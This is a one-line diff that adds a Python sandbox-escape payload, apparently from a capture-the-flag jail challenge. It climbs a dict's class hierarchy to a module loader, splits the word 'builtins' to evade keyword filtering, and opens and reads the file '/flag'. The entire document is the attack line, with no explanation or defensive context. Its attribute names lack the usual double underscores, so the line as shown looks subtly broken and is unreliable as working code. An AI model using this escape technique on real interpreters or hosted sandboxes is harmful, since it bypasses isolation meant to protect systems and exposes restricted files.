@@ -1,0 +1,1 @@
+print({}.class.mro()[1].subclasses()[84].load_module('buil'+'tins').open('/flag').read())
